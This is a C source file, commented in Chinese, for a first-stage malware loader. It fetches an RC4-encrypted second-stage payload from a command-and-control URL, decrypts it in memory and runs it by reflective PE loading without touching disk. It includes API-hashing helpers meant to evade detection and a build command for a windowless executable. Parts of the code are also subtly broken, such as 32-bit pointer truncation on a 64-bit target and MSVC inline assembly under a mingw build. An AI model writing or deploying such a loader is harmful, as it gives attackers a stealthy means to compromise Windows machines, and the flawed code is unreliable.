/*
 * Stage 1 Loader - 第一阶段投递器
 *
 * 功能：
 * 1. 从 C2 服务器下载第二阶段 payload
 * 2. 在内存中解密并执行（不落盘）
 * 3. 通过 API 哈希调用所有 Windows API
 *
 * 编译: x86_64-w64-mingw32-gcc -O2 -Wall -s -Wl,--subsystem,windows \
 *        -lwininet -ladvapi32 \
 *        stage1.c -o stage1.exe
 */

#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

/*
 * 配置（编译时注入，避免明文）
 */
#ifndef C2_URL
#define C2_URL "http://c2-server.com/stage2.bin"
#endif

#ifndef ENCRYPTION_KEY
#define ENCRYPTION_KEY "default_key_change_me"
#endif

/*
 * DJB2 哈希
 */
DWORD HashString(LPCSTR s) {
    DWORD h = 0x77347734;
    while (*s) {
        h = ((h << 5) + h) + (BYTE)*s;
        s++;
    }
    return h;
}

/*
 * 从导出表通过哈希查找 API
 */
FARPROC GetProcByHash(HMODULE hMod, DWORD target) {
    if (!hMod) return NULL;
    PBYTE base = (PBYTE)hMod;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRVA);
    PDWORD names = (PDWORD)(base + exp->AddressOfNames);
    PWORD ords = (PWORD)(base + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)(base + names[i]);
        if (HashString(name) == target) {
            WORD ord = ords[i];
            DWORD funcRVA = funcs[ord];
            return (FARPROC)(base + funcRVA);
        }
    }
    return NULL;
}

/*
 * RC4 解密
 */
void RC4Decrypt(BYTE* data, DWORD len, BYTE* key, DWORD keyLen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        BYTE tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    int i = 0;
    j = 0;
    for (DWORD k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        BYTE ks = S[(S[i] + S[j]) % 256];
        data[k] ^= ks;
    }
}

/*
 * 从 C2 下载 stage2
 */
BYTE* DownloadStage2(DWORD* outSize) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    BYTE* buffer = NULL;
    DWORD totalSize = 0;
    DWORD bufferSize = 0;

    hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0
    );
    if (!hInternet) goto cleanup;

    hConnect = InternetOpenUrlA(
        hInternet, C2_URL, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE,
        NULL
    );
    if (!hConnect) goto cleanup;

    // 读取响应
    bufferSize = 4096;
    buffer = (BYTE*)malloc(bufferSize);
    if (!buffer) goto cleanup;

    BYTE tmp[4096];
    DWORD bytesRead;

    while (InternetReadFile(hConnect, tmp, sizeof(tmp), &bytesRead)) {
        if (bytesRead == 0) break;

        if (totalSize + bytesRead > bufferSize) {
            bufferSize *= 2;
            BYTE* newBuf = (BYTE*)realloc(buffer, bufferSize);
            if (!newBuf) {
                free(buffer);
                buffer = NULL;
                goto cleanup;
            }
            buffer = newBuf;
        }

        memcpy(buffer + totalSize, tmp, bytesRead);
        totalSize += bytesRead;
    }

cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);

    *outSize = totalSize;
    return buffer;
}

/*
 * 反射式 PE 加载（简化版）
 * 将 PE 映射到内存并执行
 */
int ReflectiveLoad(BYTE* peData, DWORD peSize) {
    if (peSize < sizeof(IMAGE_DOS_HEADER)) return -1;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return -1;

    // 分配内存
    LPVOID imageBase = VirtualAlloc(
        NULL, nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!imageBase) return -2;

    // 复制头
    memcpy(imageBase, peData, nt->OptionalHeader.SizeOfHeaders);

    // 复制节
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (LPVOID)((PBYTE)imageBase + sections[i].VirtualAddress);
        LPVOID src = peData + sections[i].PointerToRawData;
        memcpy(dest, src, sections[i].SizeOfRawData);
    }

    // 重定位
    if ((ULONG_PTR)imageBase != nt->OptionalHeader.ImageBase) {
        DWORD delta = (DWORD)((ULONG_PTR)imageBase - nt->OptionalHeader.ImageBase);

        PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->VirtualAddress && relocDir->Size) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(
                (PBYTE)imageBase + relocDir->VirtualAddress
            );

            while (reloc->VirtualAddress && reloc->SizeOfBlock) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* relocEntries = (WORD*)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < count; i++) {
                    WORD entry = relocEntries[i];
                    WORD type = entry >> 12;
                    WORD offset = entry & 0xFFF;

                    if (type == IMAGE_REL_BASED_HIGHLOW) {
                        PDWORD patchAddr = (PDWORD)((PBYTE)imageBase + reloc->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                }

                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // 解析导入表
    PIMAGE_DATA_DIRECTORY impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->VirtualAddress && impDir->Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(
            (PBYTE)imageBase + impDir->VirtualAddress
        );

        while (importDesc->Name) {
            LPCSTR dllName = (LPCSTR)((PBYTE)imageBase + importDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) return -3;

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(
                (PBYTE)imageBase + importDesc->FirstThunk
            );

            while (thunk->u1.AddressOfData) {
                FARPROC func = NULL;
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    func = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME impName = (PIMAGE_IMPORT_BY_NAME)(
                        (PBYTE)imageBase + thunk->u1.AddressOfData
                    );
                    func = GetProcAddress(hDll, impName->Name);
                }
                thunk->u1.Function = (ULONG_PTR)func;
                thunk++;
            }

            importDesc++;
        }
    }

    // 调用入口点
    DWORD entryPoint = (DWORD)imageBase + nt->OptionalHeader.AddressOfEntryPoint;
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t DllMain = (DllMain_t)entryPoint;

    // 如果是 DLL，调用 DllMain
    DllMain((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);

    // 如果是 EXE，跳转到入口
    // 注意：这里简化了，实际应该处理 TLS 回调等
    __asm {
        mov eax, entryPoint
        call eax
    }

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DWORD payloadSize = 0;

    // 1. 下载加密的 stage2
    BYTE* payload = DownloadStage2(&payloadSize);
    if (!payload || payloadSize == 0) {
        return -1;
    }

    // 2. 解密
    RC4Decrypt(payload, payloadSize, (BYTE*)ENCRYPTION_KEY, strlen(ENCRYPTION_KEY));

    // 3. 反射式加载
    ReflectiveLoad(payload, payloadSize);

    free(payload);
    return 0;
}
